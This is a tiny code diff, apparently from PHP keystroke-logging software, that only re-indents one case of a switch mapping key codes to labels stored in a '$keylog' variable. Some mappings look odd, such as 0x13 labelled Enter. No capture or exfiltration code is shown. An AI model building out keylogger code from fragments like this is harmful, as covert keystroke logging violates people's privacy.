@@ -31,7 +31,7 @@ switch ($keys) {
         $keys = "[TAP]";//tap
 		$keylog = $keys;
         break;
-    case "0x13":
+	case "0x13":
         $keys = "[ENTER]";//enter-key
 		$keylog = $keys;
         break;
